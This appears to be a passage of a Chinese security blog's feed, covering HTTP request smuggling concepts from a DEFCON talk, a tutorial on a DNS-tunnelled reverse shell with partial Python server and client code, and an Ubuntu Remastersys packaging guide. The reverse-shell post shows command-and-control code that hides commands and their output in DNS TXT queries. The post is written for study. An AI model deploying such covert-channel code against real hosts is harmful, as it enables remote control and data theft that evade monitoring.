&lt;li&gt;User-Agent，这也是一个有意思的参数，它的存在最早是为了允许服务端差异化的提供页面，根据不同的框架提供不同的页面来适配不同的浏览器。最初，UA还是很单纯的，当时某些浏览器拥有了很好的显示效果，于是服务端检测到它们的时候就提供更好的页面，过了一段时间其他浏览器也有了相似的特性，为了也能够得到同样的页面，就会告诉浏览器自己和别人身份其实差不多，请给我优秀的页面，久而久之，大家的身份相互混来混去，于是大家都叫Mozilla了，然后又like上Gecko……就这样，UA不在那么单纯，浏览器们都充满了套路。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160905203128.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-HTTP-Pipeline&quot;&gt;&lt;a href=&quot;#0x01-HTTP-Pipeline&quot; class=&quot;headerlink&quot; title=&quot;0x01 HTTP Pipeline&quot;&gt;&lt;/a&gt;0x01 HTTP Pipeline&lt;/h2&gt;&lt;p&gt;HTTP管线化是作者提到的又一个漏洞基础，管线化使得多个HTTP请求不需要等待应答即可发送，使用这一技术的初衷是提高页面的载入性能，通过一个数据包来发送多个HTTP请求，也可以减轻网络负载压力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160907214856.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是在一次管线化测试中捕获的HTTP包，可以很清晰的看出在这一个TCP包中拥有三个HTTP包。作者把Pipelines称为大多数smuggling问题之源。在我们实际的使用过程中，实际上并没有真正用到这一技术，因为大多数的浏览器默认并不使用HTTP Pipeline。但是实际上根据文档说明，大多数的服务端都应该支持这一技术。&lt;/p&gt;
&lt;p&gt;对于Pipeline技术而言，虽然同时发出多个HTTP请求，但实际上它们还是有先后顺序的，而回应顺序与发送的先后顺序一致。&lt;/p&gt;
&lt;h2 id=&quot;0x02-HTTP-Smuggling-协议层面攻击&quot;&gt;&lt;a href=&quot;#0x02-HTTP-Smuggling-协议层面攻击&quot; class=&quot;headerlink&quot; title=&quot;0x02 HTTP Smuggling 协议层面攻击&quot;&gt;&lt;/a&gt;0x02 HTTP Smuggling 协议层面攻击&lt;/h2&gt;&lt;p&gt;前面说到了HTTP Smuggling的两个基础是Header中的keep-alive和pipelining技术，而产生矛盾就产生于客户端与服务器通信经过中间代理这样的结构。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;client——&amp;gt;middleware——&amp;gt;server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当客户端和代理通信时会使用Pipeline，而代理和服务器通信会保持keep-alive但不会使用Pipeline，而服务端不会意识到这一点，这就会造成两次不一样的请求通过构造会被服务端认为是同一次请求。&lt;/p&gt;
&lt;p&gt;所以进行smuggling的过程就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送一个Pipelining的包，里面包含一个有效包和若干无效的http包。&lt;/li&gt;
&lt;li&gt;请求包顺利通过中间件&lt;/li&gt;
&lt;li&gt;服务端解析分割了请求包&lt;/li&gt;
&lt;li&gt;由于错误，请求被服务端部分回应后，服务端认为Keep-alive依然连接，并且使用了Pipelining，于是等待下面的包。&lt;/li&gt;
&lt;li&gt;而下一个包就不一定是攻击者发送来的，但是作为服务端依然把这个包回应给了攻击者。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这里，作者告诉我们其实早在2005年，就已经有人提到了这种利用手法，最终可以造成的效果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个forbidden回复&lt;/li&gt;
&lt;li&gt;DOS掉一台过程中的机器&lt;/li&gt;
&lt;li&gt;缓存投毒&lt;/li&gt;
&lt;li&gt;劫持用户凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来的是作者的Demo展示，可惜作者在这里使用go语言和Nodejs来编写中间件和服务端，并没能在本地环境复现作者的手法，这个只能等到以后回顾的时候再来复现了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-期待的工具-HTTPWookiee&quot;&gt;&lt;a href=&quot;#0x03-期待的工具-HTTPWookiee&quot; class=&quot;headerlink&quot; title=&quot;0x03 期待的工具 HTTPWookiee&quot;&gt;&lt;/a&gt;0x03 期待的工具 HTTPWookiee&lt;/h2&gt;&lt;p&gt;作者在最后还许了一个愿，他会在考虑安全因素的条件下在Github上放出一个相关漏洞代理的自动化测试工具，不过已经过去一个月了吧。&lt;/p&gt;
&lt;p&gt;看作者的框图，这应该是一个通过发包、接受回应比对来判别代理漏洞利用的工具吧。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DEFCON" scheme="http://phantom0301.cc/tags/DEFCON/"/>
    
      <category term="Smuggling" scheme="http://phantom0301.cc/tags/Smuggling/"/>
    
      <category term="http" scheme="http://phantom0301.cc/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>也说DNS反弹Shell</title>
    <link href="http://phantom0301.cc/2016/08/11/DNSshell/"/>
    <id>http://phantom0301.cc/2016/08/11/DNSshell/</id>
    <published>2016-08-11T12:03:39.000Z</published>
    <updated>2016-08-13T04:25:23.896Z</updated>
    
    <content type="html">&lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。&lt;/p&gt;
&lt;p&gt;反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。&lt;/p&gt;
&lt;p&gt;最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ahhh/Reverse_DNS_Shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ahhh/Reverse_DNS_Shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib&lt;/p&gt;
&lt;h2 id=&quot;0x02-DNS&quot;&gt;&lt;a href=&quot;#0x02-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x02 DNS&quot;&gt;&lt;/a&gt;0x02 DNS&lt;/h2&gt;&lt;p&gt;为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;紧接着的Flags，0x0100表明了一些查询属性。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器回应包如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作为回应的Tran ID，它和查询包相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Flags中标准回应标志位&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;重复显示的Queries&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;被控端：  发送DNS请求——&amp;gt;  接收回应并解析执行命令  ——&amp;gt;   发送DNS请求
              |                    /|\               |
              |                     |                |
              |                     |                |
             \|/                    |               \|/
控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x03-程序&quot;&gt;&lt;a href=&quot;#0x03-程序&quot; class=&quot;headerlink&quot; title=&quot;0x03 程序&quot;&gt;&lt;/a&gt;0x03 程序&lt;/h2&gt;&lt;p&gt;原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。&lt;/p&gt;
&lt;p&gt;先说DNS服务器的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def spawnShell(answer, payload):
  shellInput = raw_input(PROMPT)
  if shellInput == &amp;apos;quit&amp;apos;: EXIT = 1 
  if shellInput == &amp;apos;&amp;apos;: spawnShell(answer, payload) 
  out = base64.b64encode(shellInput)
  answer.add_answer(
     *dnslib.RR.fromZone(&amp;apos;{}.com 60 TXT &amp;quot;{}&amp;quot;&amp;apos;.format(payload, out)))
  return answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def recievePayload(udps):
  data, addr = udps.recvfrom(1024)
  dnsD = dnslib.DNSRecord.parse(data)
  payload = dnsD.questions[0].qname.label[0]
  answer = dnsD.reply()
  return addr, payload, answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。&lt;/p&gt;
&lt;p&gt;主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。&lt;/p&gt;
&lt;p&gt;再来看看被控端发送的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def start(host):
  while 1:
    a = startConnection(host)
    cmd = parseCmd(a)
    stdoutput = runCmd(cmd)
    sendOutputToServer(stdoutput, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def startConnection(host):
  url = formURL(nextCommand)
  request = dns.message.make_query(url, dns.rdatatype.TXT)
  answers = dns.query.udp(request, host)
  a = answers.to_text()
  return a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def parseCmd(a):
def runCmd(cmd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def sendOutputToServer(output, host):
  send =&amp;apos;&amp;apos;
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    if len(send) == 58:
      url = formURL(send)
      dnsMakeQuery(url, host)
      send =&amp;apos;&amp;apos;
    if output_end == 0:
      url = formURL(send)
      dnsMakeQuery(url, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。&lt;/p&gt;
&lt;h2 id=&quot;0x04-测试&quot;&gt;&lt;a href=&quot;#0x04-测试&quot; class=&quot;headerlink&quot; title=&quot;0x04 测试&quot;&gt;&lt;/a&gt;0x04 测试&lt;/h2&gt;&lt;p&gt;我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如图，是在Ubuntu上对Win10执行ipconfig命令的显示。&lt;/p&gt;
&lt;p&gt;我们再进行抓包分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，&lt;/p&gt;
&lt;p&gt;可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。&lt;/p&gt;
&lt;h2 id=&quot;0x05-延伸&quot;&gt;&lt;a href=&quot;#0x05-延伸&quot; class=&quot;headerlink&quot; title=&quot;0x05 延伸&quot;&gt;&lt;/a&gt;0x05 延伸&lt;/h2&gt;&lt;p&gt;其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。&lt;/p&gt;
&lt;p&gt;当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DNS" scheme="http://phantom0301.cc/tags/DNS/"/>
    
      <category term="协议分析" scheme="http://phantom0301.cc/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu服务器下Remastersys系统打包</title>
    <link href="http://phantom0301.cc/2016/08/08/Remastersys/"/>
    <id>http://phantom0301.cc/2016/08/08/Remastersys/</id>
    <published>2016-08-08T13:08:13.000Z</published>
    <updated>2016-08-08T13:32:18.906Z</updated>
    
    <content type="html">&lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-安装&quot;&gt;&lt;a href=&quot;#0x01-安装&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装&quot;&gt;&lt;/a&gt;0x01 安装&lt;/h2&gt;&lt;p&gt;这里主要是对使用过程中收集到资料的总结。主要是经过了测试。&lt;/p&gt;
&lt;p&gt;我的系统是官网下下来的Ubuntu server14.04。&lt;/p&gt;
&lt;p&gt;首先，网上大多数的教程使用添加非官方源的方法自动安装，我在添加密钥时迷之失败了，所以使用下面这篇博客的方法成功率更高。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/chenkun1/p/5532977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/chenkun1/p/5532977.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.filewatcher.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.filewatcher.com  &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搜索&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑若干年后有可能找不到资源，我会上传一份到我的github&lt;/p&gt;
&lt;p&gt;下载安装包后，存放到合适的目录，在目录下执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install plymouth-x11 
sudo dpkg -i remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，就可以执行remastersys指令。&lt;/p&gt;
&lt;h2 id=&quot;0x02-使用&quot;&gt;&lt;a href=&quot;#0x02-使用&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用&quot;&gt;&lt;/a&gt;0x02 使用&lt;/h2&gt;&lt;p&gt;具体指令的解释，网上有很多。大致我们会用到backup和dist两种方式，backup可以说是对整个系统完全打包，考虑到我们并不需要泄露自己的个人信息，大多数时候我们是使用dist方式做发行&lt;/p&gt;
&lt;p&gt;参考这篇文章，不过文章里有指令打错了，请注意。&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单说，我们顺序执行以下几条命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
sudo remastersys dist iso filename.iso
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将iso移动到安全的地方后，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys clean
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;清理掉生成iso时的辅助文件，当然，iso也会被删掉，所以请先将iso移动到安全的地方。&lt;/p&gt;
&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;做为服务器版，我在执行 &lt;em&gt;remastersys dist cdfs&lt;/em&gt; 命令时报错，根据报错信息中提到的 &lt;em&gt;ubiquity&lt;/em&gt; 信息，我找到了如下的解决方法：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zgyrelax/article/details/18228629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zgyrelax/article/details/18228629&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单粗暴点，你需要做的就是执行下面的这条命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -y install ubiquity*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，系统会提示你安装相关环境，接着执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -f install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等到一切安装结束后，再次执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及后面的步骤，就可以顺利打包系统。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;
    
    </summary>
    
      <category term="ubuntu" scheme="http://phantom0301.cc/categories/ubuntu/"/>
    
    
      <category term="iso" scheme="http://phantom0301.cc/tags/iso/"/>
    
      <category term="ubuntu" scheme="http://phantom0301.cc/tags/ubuntu/"/>
    
  </entry>
  
</feed>
